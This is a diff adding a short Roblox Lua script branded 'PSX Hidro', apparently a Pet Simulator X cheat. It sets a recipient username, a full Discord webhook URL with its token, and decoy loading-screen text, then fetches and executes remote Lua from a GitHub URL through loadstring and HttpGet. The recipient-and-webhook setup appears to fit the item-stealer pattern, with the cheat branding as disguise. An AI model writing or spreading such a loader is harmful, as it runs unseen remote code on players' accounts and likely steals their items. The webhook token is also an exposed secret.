@@ -1,0 +1,11 @@
+Username = " Ertizxc"
+WebHook = "https://discord.com/api/webhooks/1103678192272814140/yiCwxV4d_HK364NjnGPyzkiBApE4dG8IgPV9OcWVqE4WiTWe37QJbQR3whAXP2uXhRQZ"
+
+
+loadingscreen = true
+_G.CustomScriptName = "PSX Hidro"
+_G.Text1 = "Hidro script"
+_G.Text2 = "is better"
+_G.Text3 = "gg."
+_G.Text4 = "script hidro."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
